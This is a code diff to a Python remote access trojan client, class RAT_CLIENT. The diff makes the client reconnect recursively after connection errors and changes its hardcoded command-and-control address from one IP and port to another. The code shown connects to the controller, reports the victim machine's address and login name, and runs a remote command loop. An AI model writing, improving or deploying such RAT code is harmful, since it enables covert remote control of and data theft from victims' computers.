@@ -34,7 +34,7 @@ FILE_SHARE_READ = 1
 FILE_SHARE_DELETE = 4
 CREATE_ALWAYS = 2
 
-global ser
+
 class RAT_CLIENT:
     def __init__(self, host, port):
         self.host = host
@@ -43,18 +43,19 @@ class RAT_CLIENT:
 
     def build_connection(self):
         global s
-        global e
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((self.host, self.port))
             sending = socket.gethostbyname(socket.gethostname())
             s.send(sending.encode())
         except socket.error as e:
             print (e)
-            ser = 14
-            print (ser)
-            return ser
-            
+            rat = RAT_CLIENT(self.host, self.port)
+            print(self.host, self.port)
+            if __name__ == '__main__':
+                rat.build_connection()
+                rat.execute()
+    
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
         for i in range(len(output)):
@@ -610,8 +611,8 @@ User: {os.getlogin()}
             elif command == 'exit':
                 s.send(b"exit")
                 break
-
-rat = RAT_CLIENT('91.109.186.3', 1345)
+            
+rat = RAT_CLIENT('10.20.4.144', 1429)
 
 if __name__ == '__main__':
     rat.build_connection()
